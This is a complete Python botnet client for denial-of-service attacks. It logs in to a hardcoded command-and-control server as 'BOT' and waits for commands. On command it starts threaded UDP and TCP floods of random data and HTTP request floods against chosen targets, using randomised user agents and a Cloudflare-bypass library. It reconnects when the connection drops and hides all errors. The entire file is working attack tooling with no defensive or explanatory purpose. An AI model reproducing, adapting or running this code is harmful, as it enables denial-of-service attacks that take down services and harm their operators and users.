import socket,threading,time,requests,random,cloudscraper,string
from fake_useragent import FakeUserAgent,UserAgent

C2_ADDRESS  = "192.168.1.101"
C2_PORT     = 8080

def user_gen():
    ua = FakeUserAgent()
    data = ua.random
    return data

def user_gen2():
    ua = UserAgent()
    data = ua.random
    return data

def rand_ua(mode):
    if "FakeUser" in mode:
        ua = user_gen()
    else:
        ua = user_gen2()
    return ua

def CFB(url,method,secs):
    
    while time.time() < secs:
         
        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        if "get" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
        elif "post" in method:
            for _ in range(1500):
                scraper.post(url,headers=headers, timeout=15)
        elif "patch" in method:
            for _ in range(1500):
                scraper.patch(url,headers=headers, timeout=15)
        elif "put" in method:
            for _ in range(1500):
                scraper.put(url,headers=headers, timeout=15)
        elif "head" in method:
            for _ in range(1500):
                scraper.head(url,headers=headers, timeout=15)
        elif "delete" in method:
            for _ in range(1500):
                scraper.delete(url,headers=headers, timeout=15)
        elif "options" in method:
            for _ in range(1500):
                scraper.options(url,headers=headers, timeout=15)
        elif "all" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
                scraper.post(url,headers=headers, timeout=15)
                scraper.patch(url,headers=headers, timeout=15)
                scraper.put(url,headers=headers, timeout=15)
                scraper.head(url,headers=headers, timeout=15)
                scraper.delete(url,headers=headers, timeout=15)
                scraper.options(url,headers=headers, timeout=15)

def attack_udp(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            data = random._urandom(size)
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                for _ in range(1500):
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
        except:
            pass

def REQ_attack(ip,method,secs):
     
     while time.time() < secs:
         
        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}
        if "get" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
        elif "post" in method:
            for _ in range(1500):
                requests.post(ip,headers=headers)
        elif "put" in method:
            for _ in range(1500):
                requests.put(ip,headers=headers)
        elif "patch" in method:
            for _ in range(1500):
                requests.patch(ip,headers=headers)
        elif "delete" in method:
            for _ in range(1500):
                requests.delete(ip,headers=headers)
        elif "head" in method:
            for _ in range(1500):
                requests.head(ip,headers=headers)
        elif "options" in method:
            for _ in range(1500):
                requests.options(ip,headers=headers)
        elif "all" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
                requests.post(ip,headers=headers)
                requests.put(ip,headers=headers)
                requests.patch(ip,headers=headers)
                requests.delete(ip,headers=headers)
                requests.head(ip,headers=headers)
                requests.options(ip,headers=headers)

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            while 1:
                data = c2.recv(65536).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while 1:
                data = c2.recv(65536).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(90)
    while 1:
        try:
            data = c2.recv(69999).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()
            if command == 'PING':
                c2.send('PONG'.encode())
            elif command == ".HTTP_REQ":
                url = args[1]
                method = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=REQ_attack, args=(url,method, secs), daemon=True).start()
            elif command == ".HTTP_CFB":
                url = args[1]
                method = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
            elif command == '.TCP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.UDP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TUP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass
